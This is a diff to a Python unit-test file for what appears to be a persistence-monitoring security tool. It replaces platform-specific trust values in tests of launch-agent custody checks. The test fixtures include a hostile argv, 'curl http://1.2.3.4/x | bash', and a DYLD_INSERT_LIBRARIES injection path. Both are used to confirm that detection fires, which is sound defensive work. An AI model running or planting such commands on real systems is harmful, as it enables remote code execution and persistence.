@@ -25,6 +25,7 @@ import unittest
 
 sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))
 import aegis  # noqa: E402
+from conftest import PUBLISHER_TRUST, SUSPICIOUS_TRUST  # noqa: E402
 
 GIT = aegis._git_bin()
 
@@ -435,8 +436,18 @@ if __name__ == "__main__":
 # --------------------------------------------------------------------------- #
 
 def _prec(program, sha, target=None, target_sha=None, authority=None,
-          trust="developer-id", args=None, env=None, label="com.example.job"):
-    """A persistence record in the shape every platform snapshot produces."""
+          trust=None, args=None, env=None, label="com.example.job"):
+    """A persistence record in the shape every platform snapshot produces.
+
+    `trust` defaults to this body's own trusted-publisher verdict. It used to
+    default to the literal "developer-id" while the docstring above claimed
+    platform neutrality, and the custody gate it feeds used to compare against
+    an inlined macOS triple — platform-blind, so the mac word earned the
+    demotion on Linux and Windows too and this fixture passed everywhere by
+    asserting behaviour no real record on those bodies could produce.
+    """
+    if trust is None:
+        trust = PUBLISHER_TRUST
     if args is None:
         args = [program] + ([target] if target else [])
     return {"label": label, "program": program, "args": args,
@@ -459,30 +470,30 @@ class PersistenceCustody(unittest.TestCase):
 
     def test_pure_relocation_grades_low(self):
         """Same interpreter bytes, same payload bytes, new directory."""
-        old = _prec("/bin/bash", "aaa", "/old/dir/run.sh", "pay1", trust="apple")
-        new = _prec("/bin/bash", "aaa", "/new/dir/run.sh", "pay1", trust="apple")
+        old = _prec("/bin/bash", "aaa", "/old/dir/run.sh", "pay1", trust=PUBLISHER_TRUST)
+        new = _prec("/bin/bash", "aaa", "/new/dir/run.sh", "pay1", trust=PUBLISHER_TRUST)
         f = self._one(old, new)
         self.assertEqual(f["custody"], "relocated")
         self.assertEqual(f["severity"], "LOW")
 
     def test_payload_swap_disguised_as_a_move_is_refused(self):
         """Same directory move, DIFFERENT payload bytes -> not a relocation."""
-        old = _prec("/bin/bash", "aaa", "/old/dir/run.sh", "pay1", trust="apple")
-        new = _prec("/bin/bash", "aaa", "/new/dir/run.sh", "pay2", trust="apple")
+        old = _prec("/bin/bash", "aaa", "/old/dir/run.sh", "pay1", trust=PUBLISHER_TRUST)
+        new = _prec("/bin/bash", "aaa", "/new/dir/run.sh", "pay2", trust=PUBLISHER_TRUST)
         f = self._one(old, new)
         self.assertIsNone(f["custody"])
         self.assertEqual(f["severity"], "HIGH")
 
     def test_relocation_is_refused_when_the_baseline_never_hashed_the_payload(self):
         """A baseline predating payload hashing cannot prove the other half."""
-        old = _prec("/bin/bash", "aaa", "/old/dir/run.sh", None, trust="apple")
-        new = _prec("/bin/bash", "aaa", "/new/dir/run.sh", "pay1", trust="apple")
+        old = _prec("/bin/bash", "aaa", "/old/dir/run.sh", None, trust=PUBLISHER_TRUST)
+        new = _prec("/bin/bash", "aaa", "/new/dir/run.sh", "pay1", trust=PUBLISHER_TRUST)
         f = self._one(old, new)
         self.assertIsNone(f["custody"])
 
     def test_renamed_payload_is_not_a_relocation(self):
-        old = _prec("/bin/bash", "aaa", "/d/run.sh", "pay1", trust="apple")
-        new = _prec("/bin/bash", "aaa", "/d2/other.sh", "pay1", trust="apple")
+        old = _prec("/bin/bash", "aaa", "/d/run.sh", "pay1", trust=PUBLISHER_TRUST)
+        new = _prec("/bin/bash", "aaa", "/d2/other.sh", "pay1", trust=PUBLISHER_TRUST)
         f = self._one(old, new)
         self.assertIsNone(f["custody"])
 
@@ -504,8 +515,8 @@ class PersistenceCustody(unittest.TestCase):
         self.assertEqual(f["severity"], "HIGH")
 
     def test_unsigned_rebuild_is_never_publisher_stable(self):
-        old = _prec("/Users/u/bin/tool", "old", authority="x", trust="adhoc")
-        new = _prec("/Users/u/bin/tool", "new", authority="x", trust="adhoc")
+        old = _prec("/Users/u/bin/tool", "old", authority="x", trust=SUSPICIOUS_TRUST)
+        new = _prec("/Users/u/bin/tool", "new", authority="x", trust=SUSPICIOUS_TRUST)
         f = self._one(old, new)
         self.assertIsNone(f["custody"])
 
@@ -519,8 +530,8 @@ class PayloadSwapIsVisible(unittest.TestCase):
 
     def test_rewriting_the_script_under_a_stable_config_now_fires(self):
         path = "/Library/LaunchAgents/x.plist"
-        old = _prec("/bin/bash", "aaa", "/d/run.sh", "pay1", trust="apple")
-        new = _prec("/bin/bash", "aaa", "/d/run.sh", "EVIL", trust="apple")
+        old = _prec("/bin/bash", "aaa", "/d/run.sh", "pay1", trust=PUBLISHER_TRUST)
+        new = _prec("/bin/bash", "aaa", "/d/run.sh", "EVIL", trust=PUBLISHER_TRUST)
         fs = [f for f in aegis.check_persistence({path: old}, {path: new})
               if f["title"] == "Persistence item CHANGED"]
         self.assertEqual(len(fs), 1, "a rewritten payload must be reported")
@@ -530,8 +541,8 @@ class PayloadSwapIsVisible(unittest.TestCase):
     def test_a_field_merely_appearing_is_not_a_swap(self):
         """Upgrading into payload hashing must not alert on every job at once."""
         path = "/Library/LaunchAgents/x.plist"
-        old = _prec("/bin/bash", "aaa", "/d/run.sh", None, trust="apple")
-        new = _prec("/bin/bash", "aaa", "/d/run.sh", "pay1", trust="apple")
+        old = _prec("/bin/bash", "aaa", "/d/run.sh", None, trust=PUBLISHER_TRUST)
+        new = _prec("/bin/bash", "aaa", "/d/run.sh", "pay1", trust=PUBLISHER_TRUST)
         fs = [f for f in aegis.check_persistence({path: old}, {path: new})
               if f["title"] == "Persistence item CHANGED"]
         self.assertEqual(fs, [])
@@ -542,8 +553,8 @@ class AttackDefinedIsNeverDemoted(unittest.TestCase):
 
     def test_dylib_injection_survives_a_perfect_relocation(self):
         path = "/Library/LaunchAgents/x.plist"
-        old = _prec("/bin/bash", "aaa", "/old/run.sh", "pay1", trust="apple")
-        new = _prec("/bin/bash", "aaa", "/new/run.sh", "pay1", trust="apple",
+        old = _prec("/bin/bash", "aaa", "/old/run.sh", "pay1", trust=PUBLISHER_TRUST)
+        new = _prec("/bin/bash", "aaa", "/new/run.sh", "pay1", trust=PUBLISHER_TRUST,
                     env={"DYLD_INSERT_LIBRARIES": "/tmp/eve.dylib"})
         fs = [f for f in aegis.check_persistence({path: old}, {path: new})
               if f["title"] == "Persistence item CHANGED"]
@@ -554,9 +565,9 @@ class AttackDefinedIsNeverDemoted(unittest.TestCase):
     def test_hostile_argv_survives_a_perfect_relocation(self):
         path = "/Library/LaunchAgents/x.plist"
         args = ["/bin/bash", "-c", "curl http://1.2.3.4/x | bash"]
-        old = _prec("/bin/bash", "aaa", trust="apple",
+        old = _prec("/bin/bash", "aaa", trust=PUBLISHER_TRUST,
                     args=["/bin/bash", "-c", "echo hi"])
-        new = _prec("/bin/bash", "aaa", trust="apple", args=args)
+        new = _prec("/bin/bash", "aaa", trust=PUBLISHER_TRUST, args=args)
         fs = [f for f in aegis.check_persistence({path: old}, {path: new})
               if f["title"] == "Persistence item CHANGED"]
         self.assertEqual(len(fs), 1)
